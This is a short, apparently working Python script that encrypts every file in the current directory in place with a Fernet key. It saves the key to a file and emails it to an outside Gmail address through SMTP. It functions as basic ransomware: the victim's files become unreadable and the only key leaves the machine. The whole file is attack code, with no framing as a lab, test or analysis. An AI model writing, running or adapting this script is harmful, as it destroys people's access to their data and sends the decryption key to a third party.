import os
from cryptography.fernet import Fernet
import smtplib
from email.message import EmailMessage

# Generate encryption key
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt files in the current directory
for file in os.listdir():
    if os.path.isfile(file):
        with open(file, 'rb') as f:
            data = f.read()
        encrypted_data = cipher.encrypt(data)
        with open(file, 'wb') as f:
            f.write(encrypted_data)

# Save the key to a file
with open('file.txt', 'wb') as f:
    f.write(key)

# Email the key file
msg = EmailMessage()
msg.set_content('Please find the decryption key attached.')
msg['Subject'] = 'Decryption Key'
msg['From'] = 'your_email@example.com'
msg['To'] = 'acrossnow8@gmail.com'

with open('file.txt', 'rb') as f:
    key_data = f.read()

msg.add_attachment(key_data, maintype='application', subtype='octet-stream', filename='file.txt')

with smtplib.SMTP('smtp.example.com', 587) as smtp:
    smtp.starttls()
    smtp.login('your_email@example.com', 'your_password')
    smtp.send_message(msg)
